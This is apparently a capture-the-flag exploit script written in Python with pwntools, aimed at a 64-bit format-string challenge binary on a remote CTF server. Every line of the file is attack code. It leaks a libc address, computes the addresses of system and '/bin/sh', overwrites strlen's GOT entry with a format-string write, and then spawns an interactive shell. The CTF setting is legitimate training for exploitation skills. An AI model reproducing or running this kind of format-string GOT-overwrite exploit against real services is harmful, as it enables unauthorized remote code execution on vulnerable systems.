#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/21 18:22:52
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
debug = 0
if debug:
    sh = process('axb_2019_fmt64')
else:
    sh = remote('node3.buuoj.cn',26857)
elf = ELF('axb_2019_fmt64')
put_got = elf.got["puts"]
strlen_got = elf.got['strlen']
# libc = ELF()
payload = '%9$s' + 'aaaa' + p64(put_got)
sh.recvuntil("Please tell me:")
sh.send(payload)
puts_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info("success leak puts_addr:0x%x"%puts_addr)
libc = LibcSearcher("puts",puts_addr)
libc_base = puts_addr - libc.dump("puts")
system_addr = libc_base + libc.dump('system')
log.info("success leak system_addr:0x%x"%system_addr)
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info("success leak binsh_addr:0x%x"%binsh_addr)
# gdb.attach(sh)
# pause()
sys_low = system_addr & 0xffff
sys_high = (system_addr >> 16) & 0xff #sys_high = (system_addr >> 16) & 0xff
payload = '%' + str(sys_high - 9) + 'c%12$hhn' + '%' + str(sys_low - sys_high) + 'c%13$hn'
payload = payload.ljust(32,'a') + p64(strlen_got + 2) + p64(strlen_got)
sh.recvuntil("Please tell me:")
sh.send(payload)
payload = ';/bin/sh\x00'
sh.recvuntil("Please tell me:")

sh.send(payload)
sh.interactive()